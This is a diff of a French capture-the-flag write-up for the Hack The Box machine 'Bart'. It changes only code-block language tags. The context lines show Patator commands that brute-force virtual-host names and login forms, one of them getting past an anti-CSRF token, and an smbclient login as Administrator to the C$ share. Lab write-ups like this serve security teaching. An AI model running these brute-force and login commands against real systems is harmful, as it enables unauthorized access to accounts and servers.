@@ -48,7 +48,7 @@ La technique employée sera en réalité un brute-force du header HTTP Host et l
 
 Quand il s'agit de brute-force sur HTTP, [Patator](https://github.com/lanjelot/patator) est selon moi l'outil le mieux pensé. Il y a certes pas mal d'options à passer mais c'est le prix pour sa flexibilité :)  
 
-```shellsession
+```bash
 devloop@kali:~$ patator http_fuzz url=http://10.10.10.81/ method=GET header="Host: FILE0.bart.htb" -x ignore:code=302 0=/usr/share/sublist3r/subbrute/names.txt
 11:35:16 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2018-05-26 11:35 CEST
 11:35:16 patator    INFO -                                                                              
@@ -76,7 +76,7 @@ So let's go brute-force ! On prépare une liste de mots de passe éventuels (à 
 
 La difficulté ici est la présence d'un token anti-CSRF sur le formulaire de login. Cela n'est pas une difficulté pour Patator du moment qu'on lui donne les bonnes options :  
 
-```shellsession
+```bash
 devloop@kali:~$ patator http_fuzz url=http://monitor.bart.htb/index.php method=POST body="csrf=__CSRF__&user_name=harvey&user_password=FILE0" accept_cookie=1 before_urls=http://monitor.bart.htb/index.php before_egrep='__CSRF__:name="csrf" value="([0-9a-f]+)"' 0=passwords.txt -x ignore:fgrep='The information is incorrect'
 14:00:35 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2018-05-26 14:00 CEST
 14:00:35 patator    INFO -                                                                              
@@ -133,7 +133,7 @@ Cet accès nous permet de voir un nouveau hostname parmi les serveurs monitorés
 
 Un formulaire de login pour une appli de chat vraisemblablement home-made nous incite une fois encore à trouver un mot de passe pour ce cher *Harvey*. De quoi relancer *Patator* :  
 
-```shellsession
+```bash
 devloop@kali:~$ patator http_fuzz url=http://internal-01.bart.htb/simple_chat/login.php method=POST body="uname=harvey&passwd=FILE0&submit=Login" follow=1 accept_cookie=1 0=passwords.txt -x ignore:fgrep='Invalid Username or Password' -x ignore:fgrep='The Password must be at least 8 characters'
 14:44:21 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2018-05-26 14:44 CEST
 14:44:21 patator    INFO -                                                                              
@@ -355,7 +355,7 @@ On trouve ainsi une entrée intéressante avec un bon vieux grep sur password :
 
 Ce mot de passe est à utiliser tel quel (ce n'est pas un hash). On peut alors utiliser smbclient (après mise en place d'une redirection de port) pour accéder aux deux flags du système :  
 
-```shellsession
+```bash
 devloop@kali:~$ smbclient -I 127.0.0.1 -U Administrator '//BART/c$'
 WARNING: The "syslog" option is deprecated
 Enter WORKGROUP\Administrator's password:
